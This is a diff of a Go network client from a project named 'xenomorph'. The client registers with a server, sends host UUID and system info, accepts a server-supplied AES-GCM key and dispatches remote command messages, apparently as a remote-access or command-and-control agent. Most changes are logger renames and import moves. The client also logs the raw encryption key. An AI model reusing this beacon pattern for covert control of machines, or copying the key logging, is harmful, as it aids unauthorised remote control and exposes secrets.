@@ -7,12 +7,12 @@ import (
 	"net"
 	"time"
 
-	"github.com/codevault-llc/xenomorph-client/internal/command"
-	"github.com/codevault-llc/xenomorph-client/internal/secure"
-	"github.com/codevault-llc/xenomorph-client/internal/services/system"
-	"github.com/codevault-llc/xenomorph-client/pkg/logger"
-	"github.com/codevault-llc/xenomorph-client/pkg/types"
-	"github.com/codevault-llc/xenomorph-client/pkg/utils"
+	"github.com/codevault-llc/xenomorph/internal/netclient/command"
+	"github.com/codevault-llc/xenomorph/internal/netclient/services/system"
+	"github.com/codevault-llc/xenomorph/internal/secure"
+	"github.com/codevault-llc/xenomorph/pkg/logger"
+	"github.com/codevault-llc/xenomorph/pkg/types"
+	"github.com/codevault-llc/xenomorph/pkg/utils"
 	"go.uber.org/zap"
 )
 
@@ -56,9 +56,11 @@ func (c *Client) Run() error {
 	defer c.Close()
 
 	if err := c.Connect(); err != nil {
-		logger.GetLogger().Error("Failed to connect to server", zap.Error(err))
+		logger.L().Error("Failed to connect to server", zap.Error(err))
 		return err
 	}
+
+	logger.L().Info("Connected to server", zap.String("address", c.Address))
 
 	c.Send(types.MsgConnect, 0, 0, []byte(system.GetUUID()))
 	c.ExpectAckOrHandshake()
@@ -69,7 +71,7 @@ func (c *Client) Run() error {
 	info := system.Info()
 	infoBytes, err := json.Marshal(info)
 	if err != nil {
-		logger.GetLogger().Error("Failed to marshal registration info", zap.Error(err))
+		logger.L().Error("Failed to marshal registration info", zap.Error(err))
 		return err
 	}
 
@@ -80,17 +82,22 @@ func (c *Client) Run() error {
 	for {
 		msgType, _, msgID, payload, err := c.Read()
 		if err != nil {
-			logger.GetLogger().Error("Failed to read message", zap.Error(err))
+			if netErr, ok := err.(net.Error); ok && (netErr.Timeout()) {
+				logger.L().Info("Connection closed by server or client", zap.Error(err))
+				return nil
+			}
+
+			logger.L().Error("Failed to read message", zap.Error(err))
 			continue
 		}
 
 		if msgType == types.MsgPing {
-			logger.GetLogger().Debug("Received ping message")
+			logger.L().Debug("Received ping message")
 			continue
 		}
 
 		if msgType == types.MsgCommand {
-			c.Handler.Handle(c.Conn, msgID, payload)
+			c.Handler.Handle(c, msgID, payload)
 		}
 	}
 }
@@ -104,7 +111,7 @@ func (c *Client) Send(msgType byte, flags byte, msgID uint32, payload []byte) {
 		var err error
 		payload, err = c.Sec.Encrypt(payload)
 		if err != nil {
-			logger.GetLogger().Error("Failed to encrypt payload", zap.Error(err), zap.String("type", fmt.Sprintf("%d", msgType)))
+			logger.L().Error("Failed to encrypt payload", zap.Error(err), zap.String("type", fmt.Sprintf("%d", msgType)))
 			return
 		}
 	}
@@ -121,13 +128,19 @@ func (c *Client) Send(msgType byte, flags byte, msgID uint32, payload []byte) {
 	binary.BigEndian.PutUint32(header[6:], msgID)
 
 	if c.Conn == nil {
-		logger.GetLogger().Error("Connection is nil, cannot send message", zap.String("type", fmt.Sprintf("%d", msgType)))
+		logger.L().Error("Connection is nil, cannot send message", zap.String("type", fmt.Sprintf("%d", msgType)))
 		return
 	}
 
 	_, err := c.Conn.Write(header)
 	if err != nil {
-		logger.GetLogger().Error("Failed to send message header", zap.Error(err), zap.String("type", fmt.Sprintf("%d", msgType)))
+		logger.L().Error("Failed to send message header", zap.Error(err), zap.String("type", fmt.Sprintf("%d", msgType)))
+		return
+	}
+
+	_, err = c.Conn.Write(payload)
+	if err != nil {
+		logger.L().Error("Failed to send message payload", zap.Error(err), zap.String("type", fmt.Sprintf("%d", msgType)))
 		return
 	}
 }
@@ -156,7 +169,7 @@ func (c *Client) Read() (msgType byte, flags byte, msgID uint32, payload []byte,
 	if flags&0x1 != 0 { // compression flag
 		payload, err = utils.Decompress(payload)
 		if err != nil {
-			logger.GetLogger().Error("Failed to decompress payload", zap.Error(err), zap.ByteString("payload", payload))
+			logger.L().Error("Failed to decompress payload", zap.Error(err), zap.ByteString("payload", payload))
 			return
 		}
 	}
@@ -164,7 +177,7 @@ func (c *Client) Read() (msgType byte, flags byte, msgID uint32, payload []byte,
 	if c.Sec != nil {
 		payload, err = c.Sec.Decrypt(payload)
 		if err != nil {
-			logger.GetLogger().Error("Failed to decrypt payload", zap.Error(err), zap.ByteString("payload", payload))
+			logger.L().Error("Failed to decrypt payload", zap.Error(err), zap.ByteString("payload", payload))
 			return
 		}
 	}
@@ -177,15 +190,15 @@ func (c *Client) ExpectAck() (bool, error) {
 	for {
 		msgType, _, _, payload, err := c.Read()
 		if err != nil {
-			logger.GetLogger().Error("Failed to read acknowledgment message", zap.Error(err))
+			logger.L().Error("Failed to read acknowledgment message", zap.Error(err))
 			return false, err
 		}
 
 		if msgType == types.MsgAck {
-			logger.GetLogger().Info("Received acknowledgment from server", zap.ByteString("payload", payload))
+			logger.L().Info("Received acknowledgment from server", zap.ByteString("payload", payload))
 			return true, nil
 		} else {
-			logger.GetLogger().Warn("Expected MsgAck but received different message type", zap.Uint8("msgType", msgType), zap.ByteString("payload", payload))
+			logger.L().Warn("Expected MsgAck but received different message type", zap.Uint8("msgType", msgType), zap.ByteString("payload", payload))
 			return false, fmt.Errorf("expected MsgAck but received %d", msgType)
 		}
 	}
@@ -196,34 +209,34 @@ func (c *Client) ExpectAckOrHandshake() (bool, error) {
 	for {
 		msgType, _, _, payload, err := c.Read()
 		if err != nil {
-			logger.GetLogger().Error("Failed to read acknowledgment or handshake message", zap.Error(err))
+			logger.L().Error("Failed to read acknowledgment or handshake message", zap.Error(err))
 			return false, err
 		}
 
 		switch msgType {
 			case types.MsgAck:
-				logger.GetLogger().Info("Received acknowledgment from server", zap.ByteString("payload", payload))
+				logger.L().Info("Received acknowledgment from server", zap.ByteString("payload", payload))
 				return true, nil
 			case types.MsgHandshake:
 				var handshake types.HandshakePayload
 
 				if err := json.Unmarshal(payload, &handshake); err != nil {
-					logger.GetLogger().Error("Failed to unmarshal handshake payload", zap.Error(err), zap.ByteString("payload", payload))
+					logger.L().Error("Failed to unmarshal handshake payload", zap.Error(err), zap.ByteString("payload", payload))
 					return false, err
 				}
 
 				if handshake.Encryption == "aes-gcm" {
 					if err := c.Sec.InitFromRawKey(handshake.Key); err != nil {
-						logger.GetLogger().Error("Failed to initialize secure connection with provided key", zap.Error(err), zap.ByteString("key", handshake.Key))
+						logger.L().Error("Failed to initialize secure connection with provided key", zap.Error(err), zap.ByteString("key", handshake.Key))
 						return false, err
 					} else {
-						logger.GetLogger().Info("Secure connection established with AES-GCM encryption", zap.ByteString("key", handshake.Key))
+						logger.L().Info("Secure connection established with AES-GCM encryption", zap.ByteString("key", handshake.Key))
 					}
 				}
 
 				return true, nil
 			default:
-				logger.GetLogger().Warn("Expected MsgAck or MsgHandshake but received different message type", zap.Uint8("msgType", msgType), zap.ByteString("payload", payload))
+				logger.L().Warn("Expected MsgAck or MsgHandshake but received different message type", zap.Uint8("msgType", msgType), zap.ByteString("payload", payload))
 				return false, fmt.Errorf("expected MsgAck or MsgHandshake but received %d", msgType)
 		}
 	}
@@ -237,7 +250,7 @@ func (c *Client) keepAlive() {
 		select {
 		case <-ticker.C:
 			c.Send(types.MsgPing, 0, 0, []byte{})
-			logger.GetLogger().Debug("Sent keep-alive ping")
+			logger.L().Debug("Sent keep-alive ping")
 		case <-c.KeepAlive:
 			ticker.Stop()
 			return
